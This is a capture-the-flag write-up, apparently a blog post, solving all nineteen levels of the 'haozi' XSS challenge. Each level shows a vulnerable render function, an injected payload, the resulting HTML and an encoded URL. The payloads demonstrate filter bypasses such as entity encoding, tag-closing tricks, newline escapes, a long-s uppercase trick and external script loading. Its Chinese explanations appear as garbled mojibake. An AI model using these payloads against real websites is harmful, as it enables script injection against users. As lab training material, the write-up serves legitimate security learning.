---
title: è€—å­XSS
excerpt: æºç ã€XSSâ€¦â€¦
index_img: /img/article-head/è€—å­XSS.png
date: "2022/8/11 8:30:25"
updated: "2022/8/11 12:30:25"
hide: false
tags:
- Security
- audit
- XSS
categories:
- Security
- audit
- XSS
---

- [0x00](#0x00)
- [0x01](#0x01)
- [0x02](#0x02)
- [0x03](#0x03)
- [0x04](#0x04)
- [0x05](#0x05)
- [0x06](#0x06)
- [0x07](#0x07)
- [0x08](#0x08)
- [0x09](#0x09)
- [0x0A](#0x0a)
- [0x0B](#0x0b)
- [0x0C](#0x0c)
- [0x0D](#0x0d)
- [0x0E](#0x0e)
- [0x0F](#0x0f)
- [0x10](#0x10)
- [0x11](#0x11)
- [0x12](#0x12)


[è€—å­XSS](https://xss.haozi.me/)

## 0x00

- server æºç 

```php
function render (input) {
  return '<div>' + input + '</div>'
}
```

- æ’å…¥ä»£ç 

```html
<script>alert(1)</script>
```

- ç½‘é¡µä»£ç 

```html
<div><script>alert(1)</script></div>
```

- URL

```url
http://xss.test/?input=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

## 0x01

- server æºç 

è¾“å…¥å‚æ•°è¢«æ”¾åœ¨æ–‡æœ¬æ ‡ç­¾é‡Œï¼Œæ–‡æœ¬æ ‡ç­¾å‰åé—­åˆå³å¯

```php
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```

- æ’å…¥ä»£ç 

```html
</textarea><script>alert(1)</script><textarea>
```

- ç½‘é¡µä»£ç 

```html
<textarea></textarea><script>alert(1)</script><textarea></textarea>
```

- URL

```url
http://xss.test/?input=%3C%2Ftextarea%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Ctextarea%3E
```

## 0x02

- server æºç 

å‚æ•°ä½œä¸º `<input>` æ ‡ç­¾çš„ value å›æ˜¾åˆ°å‰ç«¯ï¼Œå¯ä»¥é—­åˆ value åŠ ä¸Šonclickäº‹ä»¶ï¼Œæˆ–è€…é—­åˆ `<input>` æ·»åŠ  alert

```php
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```

- æ’å…¥ä»£ç 

```html
'"><script>alert(1)</script>

" onclick=alert(1) "
```

- ç½‘é¡µä»£ç 

```html
<input type="name" value="'"><script>alert(1)</script>">

<input type="name" value="" onclick=alert(1) "">
```

- URL

```url
http://xss.test/?input='%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E

http://xss.test/?input=%22%20onclick%3Dalert(1)%20%22
```

## 0x03

- server æºç 

è¿‡æ»¤æ‹¬å· `[()]`ï¼Œå¯ä»¥ä½¿ç”¨åå¼•å·ä»£æ›¿ï¼Œhtmlç¼–ç ç»•è¿‡ï¼Œæˆ–è€…å¼•ç”¨å¤–éƒ¨jsæ–‡ä»¶

```php
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

- æ’å…¥ä»£ç 

```html
# åå¼•å·
<script>alert`1`</script> 

# htmlç¼–ç ç»•è¿‡
<img src=# onerror=alert&#x28;1&#x29;>
```

- ç½‘é¡µä»£ç 

```html
# åå¼•å·
<script>alert`1`</script>

# htmlç¼–ç ç»•è¿‡
<img src=# onerror=alert&#x28;1&#x29;>
```

- URL

```url
# åå¼•å·
http://xss.test/?input=%3Cscript%3Ealert%601%60%3C%2Fscript%3E%20

# htmlç¼–ç ç»•è¿‡
http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E

```

## 0x04

- server æºç 

åå¼•å·ä¹Ÿè¢«è¿‡æ»¤ï¼Œhtmlç¼–ç ç»•è¿‡

```php
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

- æ’å…¥ä»£ç 

```html
<img src=# onerror=alert&#x28;1&#x29;> 
```

- ç½‘é¡µä»£ç 

```html
<img src=# onerror=alert&#x28;1&#x29;>
```

- URL

```url
http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E%20
```

## 0x05

- server æºç 

è¿‡æ»¤ --> é˜²æ­¢æ ‡ç­¾é—­åˆï¼Œ--!> åŒæ ·å¯ä»¥é—­åˆæ ‡ç­¾

```php
function render (input) {
  input = input.replace(/-->/g, 'ğŸ˜‚')
  return '<!-- ' + input + ' -->'
}
```

- æ’å…¥ä»£ç 

```html
--!><img src=# onerror=alert&#x28;1&#x29;> 
```

- ç½‘é¡µä»£ç 

```html
<!-- --!><img src=# onerror=alert&#x28;1&#x29;>  -->
```

- URL

```url
http://xss.test/?input=--!%3E%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E%20
```

## 0x06

- server æºç 

è¿‡æ»¤ auto|on.*=|> ï¼Œä½¿ç”¨æ¢è¡Œç»•è¿‡

```php
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

- æ’å…¥ä»£ç 

```html
type="image" src=# onerror
=alert(1)
```

- ç½‘é¡µä»£ç 

```html
<input value=1 type="image" src=# onerror
=alert(1) type="text">
```

- URL

```url
http://xss.test/?input=type%3D%22image%22%20src%3D%23%20onerror%0A%3Dalert(1)
```

## 0x07

- server æºç 

è¿‡æ»¤ <\/?[^>]+> ï¼Œå¯¹<>æ‹¬èµ·æ¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤æ›¿æ¢æˆç©º,ä½†æ˜¯ç”±äºHTMLçš„å®¹é”™æ€§æé«˜,æ‰€ä»¥,å¯¹äºä¸é—­åˆä¹Ÿèƒ½æ¥å—

```php
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

- æ’å…¥ä»£ç 

```html
<img src=# onerror=alert(1)
```

- ç½‘é¡µä»£ç 

```html
<article><img src=# onerror=alert(1) </article>
```

- URL

```url
http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert(1)%20
```

## 0x08

- server æºç 

è¿‡æ»¤ </style> æ ‡ç­¾ï¼Œ</style > åŠ ç©ºæ ¼å³å¯ç»•è¿‡

```php
function render (src) {
  src = src.replace(/<\/style>/ig, '/* \u574F\u4EBA */')
  return `
    <style>
      ${src}
    </style>
  `
}
```

- æ’å…¥ä»£ç 

```html
</style > <script>alert(1)</script>
```

- ç½‘é¡µä»£ç 

```html
<style>
      </style > <script>alert(1)</script>
    </style>
```

- URL

```url
http://xss.test/?input=%3C%2Fstyle%20%3E%20%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

## 0x09

- server æºç 

è¿‡æ»¤äº†ä¸æ˜¯ä»¥https://www.sogmentfault.comå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä»¥https://www.sogmentfault.comå¼€å¤´ï¼Œé—­åˆæ ‡ç­¾å³å¯

```php
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```

- æ’å…¥ä»£ç 

```html
https://www.segmentfault.com"></script> <img src=# onerror="alert(1) 
```

- ç½‘é¡µä»£ç 

```html
<script src="https://www.segmentfault.com"></script> <img src=# onerror="alert(1) "></script>
```

- URL

```url
http://xss.test/?input=https%3A%2F%2Fwww.segmentfault.com%22%3E%3C%2Fscript%3E%20%3Cimg%20src%3D%23%20onerror%3D%22alert(1)%20
```

## 0x0A

- server æºç 

å°† & ' " < > / ç¬¦å·è½¬ä¸ºå®ä½“ç¼–ç ï¼Œåœ¨URLä¸­ä¼šè§£æ@åé¢çš„ç½‘å€ï¼Œå¦‚æœæ²¡å¼¹å‡ºæ¥è¯•è¯•æ¢ä¸ªæµè§ˆå™¨ï¼Œä½ç‰ˆæœ¬ç«ç‹å¯ä»¥å¼¹å‡º

```php
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```

- æ’å…¥ä»£ç 

```html
[<script>alert(1)</script>](https://www.segmentfault.com@xss.haozi.me/j.js)
```

- ç½‘é¡µä»£ç 

```html
<script src="https:&#x2f&#x2fwww.segmentfault.com@xss.haozi.me&#x2fj.js"></script>
```

- URL

```url
http://xss.test/?input=https%3A%2F%2Fwww.segmentfault.com%40xss.haozi.me%2Fj.js
```

## 0x0B

- server æºç 

è¾“å…¥å†…å®¹å¤§å†™ï¼ŒHTMLå¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯JavaScriptå¯¹å¤§å°å†™æ•æ„Ÿï¼Œåˆ™ALERT()æ— æ³•æ‰§è¡Œï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡å¯¹JavaScriptçš„çš„å¤§å†™è½¬æ¢ï¼š
1. htmlç¼–ç ç»•è¿‡
2. å¤–éƒ¨jsæ–‡ä»¶ç»•è¿‡

```php
function render (input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}
```

- æ’å…¥ä»£ç 

```html
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

- ç½‘é¡µä»£ç 

```html
<h1><IMG SRC=X ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
</h1>
```

- URL

```url
http://xss.test/?input=%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(1)%3E%0A
```

## 0x0C

- server æºç 

ä¸Šé¢˜åŸºç¡€å¢åŠ  script è¿‡æ»¤

```php
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

- æ’å…¥ä»£ç 

```html
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

- ç½‘é¡µä»£ç 

```html
<h1><IMG SRC=X ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)> 
</h1>
```

- URL

```url
http://xss.test/?input=%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(1)%3E%20%0A
```

## 0x0D

- server æºç 

è¾“å…¥å†…å®¹å¸¦å…¥åˆ°äº†æ³¨é‡Šä¸­ï¼Œå¯ä»¥ç”¨æ¢è¡Œé€ƒé€¸ã€‚ç”±äºè¿‡æ»¤äº†å•å¼•å·'ï¼Œæ‰€ä»¥åé¢çš„')å¯ä»¥ç”¨-->æ³¨é‡Šæ‰ã€‚

```php
function render (input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
          // alert('${input}')
    </script>
  `
}
```

- æ’å…¥ä»£ç 

```html
') 
alert(1)
-->
```

- ç½‘é¡µä»£ç 

```html
<script>
          // alert(') 
alert(1)
-->')
    </script>
```

- URL

```url
http://xss.test/?input=')%20%0Aalert(1)%0A--%3E
```

## 0x0E

- server æºç 

æ ‡ç­¾é‡Œçš„ç¬¬ä¸€ä¸ªå­—æ¯å‰åŠ ä¸Šä¸‹åˆ’çº¿_ï¼Œå¹¶ä¸”å¤§å†™è¾“å…¥æ‰€æœ‰å­—æ¯ï¼ŒÅ¿æ˜¯å¤è‹±è¯­ä¸­çš„sçš„å†™æ³•, è½¬æˆå¤§å†™æ˜¯æ­£å¸¸çš„S

```php
function render (input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

- æ’å…¥ä»£ç 

```html
<Å¿cript src="https://xss.haozi.me/j.js" ></script>
```

- ç½‘é¡µä»£ç 

```html
<h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS" ></SCRIPT></h1>
```

- URL

```url
http://xss.test/?input=%3C%C5%BFcript%20src%3D%22https%3A%2F%2Fxss.haozi.me%2Fj.js%22%20%3E%3C%2Fscript%3E
```

## 0x0F

- server æºç 

- é—­åˆç»•è¿‡
- æ³¨é‡Šåé¢å†…å®¹

```php
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```

- æ’å…¥ä»£ç 

```html
');alert('1
');alert(1)//
```

- ç½‘é¡µä»£ç 

```html
<img src onerror="console.error('&#39;);alert(&#39;1')">
<img src onerror="console.error('&#39;);alert(1)&#x2f;&#x2f;')">
```

- URL

```url
http://xss.test/?input=')%3Balert('1
http://xss.test/?input=')%3Balert(1)%2F%2F
```

## 0x10

- server æºç 

- é—­åˆæ ‡ç­¾
- å †å æ³¨å…¥

```php
function render (input) {
  return `
<script>
  window.data = ${input}
</script>
  `
}
```

- æ’å…¥ä»£ç 

```html
</script>``<script>alert(1)
1;alert(1);

```

- ç½‘é¡µä»£ç 

```html
<script>
  window.data = </script>`
`<script>alert(1)
</script>

<script>
  window.data = 1;alert(1);
</script>
```

- URL

```url
http://xss.test/?input=%3C%2Fscript%3E%60%0A%60%3Cscript%3Ealert(1)

http://xss.test/?input=1%3Balert(1)%3B
```

## 0x11

- server æºç 



```php
// from alf.nu
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/</g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
<script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
`
}
```

- æ’å…¥ä»£ç 

```html
");alert(1);("
");alert(1);//
```

- ç½‘é¡µä»£ç 

```html
<script>
  var url = 'javascript:console.log("\");alert(1);(\"")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>

<script>
  var url = 'javascript:console.log("\");alert(1);\/\/")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
```

- URL

```url
http://xss.test/?input=%22)%3Balert(1)%3B(%22

http://xss.test/?input=%22)%3Balert(1)%3B%2F%2F
```

## 0x12

- server æºç 

"è¢«æ›¿æ¢æˆäº†\\ï¼Œç”¨\\è¿›è¡Œè½¬ä¹‰

```php
// from alf.nu
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```

- æ’å…¥ä»£ç 

```html
\");alert(1)//
```

- ç½‘é¡µä»£ç 

```html
<script>console.log("\\");alert(1)//");</script>
```

- URL

```url
http://xss.test/?input=%5C%22)%3Balert(1)%2F%2F
```



